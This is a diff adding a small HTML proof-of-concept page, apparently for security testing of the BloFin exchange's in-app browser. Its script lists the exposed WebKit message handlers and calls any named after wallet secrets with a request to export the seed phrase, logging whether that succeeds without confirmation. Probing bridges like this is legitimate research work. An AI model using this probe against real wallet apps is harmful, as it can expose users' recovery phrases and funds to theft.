@@ -1,0 +1,26 @@
+<html>
+<body>
+<h2>BloFin Bridge Test</h2>
+<script>
+function test(){
+  let log = document.getElementById('log');
+  let handlers = window.webkit?.messageHandlers;
+  log.innerHTML += "Handlers: " + JSON.stringify(Object.keys(handlers || {})) + "<br><br>";
+
+  // Coba semua handler yang umum di exchange
+  let tests = ["blofinWallet","wallet","privateKey","exportSeed","mnemonic","keychain","Blofin"];
+  tests.forEach(name => {
+    if(handlers && handlers[name]){
+      log.innerHTML += "FOUND CRITICAL: " + name + " BISA DIPANGGIL DAPP!<br>";
+      try{
+        handlers[name].postMessage({action:"export", type:"seed"});
+        log.innerHTML += "-> postMessage terkirim tanpa konfirmasi<br>";
+      }catch(e){ log.innerHTML += "-> error: "+e+"<br>"; }
+    }
+  });
+}
+</script>
+<button onclick="test()" style="padding:20px">TEST BRIDGE</button>
+<pre id="log"></pre>
+</body>
+</html>
